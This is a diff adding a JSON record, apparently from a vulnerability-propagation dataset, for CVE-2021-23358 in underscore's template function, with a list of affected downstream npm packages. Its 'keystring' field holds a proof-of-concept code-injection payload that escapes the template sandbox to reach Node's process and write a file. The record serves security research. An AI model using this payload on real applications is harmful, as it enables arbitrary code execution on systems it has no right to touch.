@@ -1,0 +1,21 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.9.2",
+  "keymethod": "variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "jasmine-node@1.16.2",
+    "jsdoc@3.6.3",
+    "@metacell/geppetto-meta-ui@0.0.2",
+    "bookingbug-core-js@1.0.17",
+    "@girder/core@3.0.10",
+    "@atlassian/aui@8.1.6",
+    "fh-js-sdk@3.0.10",
+    "hyphy-vision@2.10.0",
+    "customizr@1.0.0",
+    "pa11y-webservice@3.0.0",
+    "seatyjs@0.2.10",
+    "transloadit@2.0.10"
+  ]
+}
